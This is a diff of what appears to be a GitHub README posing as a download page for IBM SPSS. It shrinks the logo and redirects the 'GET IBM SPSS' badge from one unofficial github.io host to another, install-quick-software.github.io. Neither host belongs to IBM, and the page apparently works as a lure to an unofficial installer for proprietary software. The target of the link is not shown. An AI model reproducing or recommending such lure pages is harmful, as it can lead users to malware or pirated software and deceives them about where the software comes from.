@@ -1,13 +1,13 @@
 # IBM SPSS – Comprehensive Data Analysis and Predictive Analytics Platform  
 
 <div align="center">  
-<img src="https://panthertech.fiu.edu/site/product-images/SPSSPersonal_media-01.png?resizeid=102&resizeh=600&resizew=600" alt="IBM SPSS Logo" width="500">  
+<img src="https://panthertech.fiu.edu/site/product-images/SPSSPersonal_media-01.png?resizeid=102&resizeh=600&resizew=600" alt="IBM SPSS Logo" width="300">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/ibm-spss">  
+<a href="https://install-quick-software.github.io/.github/ibm-spss">  
 <img src="https://img.shields.io/badge/💻_GET_IBM_SPSS-blue?style=for-the-badge&logo=apple" alt="GET IBM SPSS">  
 </a>  
 </div>
